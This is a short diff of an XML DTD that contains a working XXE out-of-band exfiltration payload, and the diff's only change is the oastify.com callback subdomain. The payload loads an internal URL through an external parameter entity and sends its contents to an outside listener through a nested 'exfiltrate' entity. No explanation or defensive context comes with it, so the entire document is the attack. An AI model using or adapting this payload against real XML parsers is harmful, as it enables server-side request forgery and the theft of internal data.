@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "http://idr.production.elmae/health.aspx">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://j4o7u7wezzurl2yp6mj4dy046vcm0dr1g.oastify.com/exfil?xxe=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://l5r9v9xg01vtm4zr7ok6e0167xdo1fv3k.oastify.com/exfil?xxe=%file;'>">
 %eval;
 %exfiltrate;
